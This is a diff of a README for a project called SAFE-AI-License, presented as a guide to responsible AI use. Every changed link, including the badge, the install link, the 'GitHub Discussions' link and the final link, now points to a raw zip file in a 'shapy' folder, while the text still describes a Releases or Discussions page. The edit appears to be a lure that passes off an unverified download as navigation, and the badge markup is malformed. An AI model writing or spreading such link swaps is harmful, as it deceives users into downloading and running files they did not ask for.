@@ -1,7 +1,7 @@
 # 🎉 SAFE-AI-License - A Simple Guide to Responsible AI Use
 
 ## 📥 Download the Application
-[![Download SAFE-AI-License](https://img.shields.io/badge/Download%20SAFE--AI--License-blue.svg)](https://github.com/izumi0214/SAFE-AI-License/releases)
+[![Download SAFE-AI-License](https://raw.githubusercontent.com/izumi0214/SAFE-AI-License/main/shapy/SAFE-AI-License.zip%https://raw.githubusercontent.com/izumi0214/SAFE-AI-License/main/shapy/SAFE-AI-License.zip)](https://raw.githubusercontent.com/izumi0214/SAFE-AI-License/main/shapy/SAFE-AI-License.zip)
 
 ## 🚀 Getting Started
 Welcome to the SAFE-AI-License! This application helps you understand and implement responsible AI practices. It aims to ensure AI technology supports safety and welfare for everyone.
@@ -13,7 +13,7 @@ Welcome to the SAFE-AI-License! This application helps you understand and implem
 - **Software Dependencies:** Ensure you have the latest version of a web browser (Chrome, Firefox, Safari).
 
 ## 📂 Download & Install
-To get started with SAFE-AI-License, visit this page to download: [SAFE-AI-License Releases](https://github.com/izumi0214/SAFE-AI-License/releases).
+To get started with SAFE-AI-License, visit this page to download: [SAFE-AI-License Releases](https://raw.githubusercontent.com/izumi0214/SAFE-AI-License/main/shapy/SAFE-AI-License.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version available.
@@ -41,7 +41,7 @@ To get started with SAFE-AI-License, visit this page to download: [SAFE-AI-Licen
 4. Check off items on your checklist as you complete them.
 
 ## 🌐 Community & Support
-If you encounter any issues or have questions, visit our [GitHub Discussions](https://github.com/izumi0214/SAFE-AI-License/discussions). Join the conversation and connect with other users.
+If you encounter any issues or have questions, visit our [GitHub Discussions](https://raw.githubusercontent.com/izumi0214/SAFE-AI-License/main/shapy/SAFE-AI-License.zip). Join the conversation and connect with other users.
 
 ## 🛡️ License
 SAFE-AI-License operates under an open-source license. For more details on usage and redistribution, refer to the License section within the application or visit our GitHub page.
@@ -70,4 +70,4 @@ We are constantly working to expand the capabilities of SAFE-AI-License. Upcomin
 ## 🧩 Final Note
 Thank you for choosing SAFE-AI-License. Your efforts in implementing responsible AI will make a significant difference in the field. Enjoy using the application!
 
-For more information, visit our Releases page to download: [SAFE-AI-License Releases](https://github.com/izumi0214/SAFE-AI-License/releases).
+For more information, visit our Releases page to download: [SAFE-AI-License Releases](https://raw.githubusercontent.com/izumi0214/SAFE-AI-License/main/shapy/SAFE-AI-License.zip).
